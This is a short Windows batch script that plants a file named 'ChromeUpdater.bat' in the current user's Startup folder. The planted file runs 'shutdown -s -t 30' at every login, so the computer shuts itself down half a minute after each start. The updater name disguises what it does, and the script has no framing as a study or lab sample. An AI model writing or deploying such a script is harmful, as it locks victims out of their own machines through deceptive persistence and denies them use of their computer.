@echo off

set "where=%~dp0"
set "desktop=%USERPROFILE%\Desktop"
set "filename=ChromeUpdater.bat"
set "here=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

echo @echo off > "%here%\%filename%"
echo shutdown -s -t 30 >> "%here%\%filename%"

exit 0
